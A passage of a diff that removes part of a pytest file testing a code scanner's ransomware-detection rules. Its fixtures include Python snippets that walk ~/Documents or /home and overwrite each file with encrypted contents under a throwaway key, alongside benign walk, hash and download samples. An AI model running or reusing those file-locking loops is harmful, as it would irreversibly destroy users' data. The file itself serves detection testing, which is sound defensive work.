-from cryptography.fernet import Fernet
-
-fernet = Fernet(Fernet.generate_key())
-
-
-def lock(path):
-    with open(path, "rb") as source:
-        data = source.read()
-    with open(path, "wb") as destination:
-        destination.write(fernet.encrypt(data))
-
-
-for root, _dirs, files in os.walk(os.path.expanduser("~/Documents")):
-    for name in files:
-        lock(os.path.join(root, name))
-""",
-                id="helper-defined-before-walk",
-            ),
-            pytest.param(
-                """\
-import os
-from Crypto.Cipher import AES
-
-cipher = AES.new(key, AES.MODE_CTR)
-for root, _dirs, files in os.walk("/home"):
-    for name in files:
-        with open(os.path.join(root, name), "r+b") as handle:
-            data = handle.read()
-            handle.seek(0)
-            handle.write(cipher.encrypt(data))
-""",
-                id="read-write-in-place",
-            ),
-        ],
-    )
-    def test_multiline_walk_encrypt_overwrite_without_note_is_detected(self, content):
-        # Without a ransom note, ``ransomware_behavior`` only fires when
-        # ``os.walk`` shares a line with the encrypt/open call.
-        findings = _run_builtin(content, "organize.py")
-
-        heuristic = _findings_from_rule(findings, "ransomware_behavior_multiline")
-        assert len(heuristic) == 1
-        assert heuristic[0].rule_id == "YR1"
-        assert heuristic[0].severity == "HIGH"
-        assert heuristic[0].confidence == 0.6
-        assert not _findings_from_rule(findings, "ransomware_behavior")
-
-    @pytest.mark.parametrize(
-        "content",
-        [
-            pytest.param(
-                """\
-import os
-import requests
-
-for root, _dirs, files in os.walk("assets"):
-    print(root, len(files))
-response = requests.get("https://example.com/model.bin")
-with open("model.bin", "wb") as handle:
-    handle.write(response.content)
-""",
-                id="walk-and-download-without-encryption",
-            ),
-            pytest.param(
-                """\
-import hashlib
-import os
-
-for root, _dirs, files in os.walk("."):
-    for name in files:
-        with open(os.path.join(root, name), "rb") as handle:
-            print(hashlib.sha256(handle.read()).hexdigest(), name)
-""",
-                id="walk-and-hash-read-only",
-            ),
-            pytest.param(
-                """\
-import sys
-from cryptography.fernet import Fernet
-
-fernet = Fernet(open("key", "rb").read())
-with open(sys.argv[1], "rb") as source:
-    data = source.read()
-with open(sys.argv[1] + ".enc", "wb") as destination:
-    destination.write(fernet.encrypt(data))
-""",
-                id="single-file-encryption-without-walk",
-            ),
-            pytest.param(
-                "import os\nfor root, _dirs, files in os.walk('.'):\n    print(root)\n"
-                + "# unrelated\n" * 100
-                + "with open('out.bin', 'wb') as handle:\n"
-                + "    handle.write(cipher.encrypt(b'data'))\n",
-                id="walk-far-from-encrypt-and-write",
-            ),
-        ],
-    )
-    def test_multiline_walk_without_nearby_encrypt_and_write_is_not_ransomware(self, content):
-        findings = _run_builtin(content, "tool.py")
-
-        assert not _has_rule(findings, "ransomware_behavior")
-
-    def test_single_line_walk_encrypt_reports_only_the_certain_rule(self):
-        content = (
-            "for root, _, files in os.walk(home): "
-            "[open(os.path.join(root, n), 'wb').write(f.encrypt(b'')) for n in files]\n"
-        )
-
-        findings = _run_builtin(content, "organize.py")
-
-        certain = _findings_from_rule(findings, "ransomware_behavior")
-        assert len(certain) == 1
-        assert certain[0].severity == "CRITICAL"
-        assert not _findings_from_rule(findings, "ransomware_behavior_multiline")
